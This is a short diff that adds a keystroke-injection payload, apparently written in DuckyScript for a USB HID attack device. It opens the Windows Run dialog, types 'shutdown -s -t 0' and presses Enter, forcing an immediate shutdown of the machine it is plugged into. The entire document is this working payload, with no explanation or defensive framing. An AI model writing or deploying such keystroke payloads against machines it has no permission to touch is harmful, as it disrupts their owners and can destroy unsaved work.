@@ -1,0 +1,4 @@
+GUI r
+DELAY 100
+STRING shutdown -s -t 0
+ENTER
